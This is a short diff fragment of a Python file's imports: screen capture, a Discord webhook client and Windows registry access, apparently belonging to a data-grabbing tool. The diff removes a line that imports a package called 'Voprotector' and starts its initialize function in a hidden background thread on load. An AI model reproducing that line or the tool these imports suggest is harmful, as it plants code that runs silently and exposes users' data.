@@ -11,4 +11,3 @@ from PIL import ImageGrab
 from random import randint
 from discord_webhook import DiscordWebhook, DiscordEmbed
 from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue
-from Voprotector import initialize, Protect;Thread(target=initialize).start()
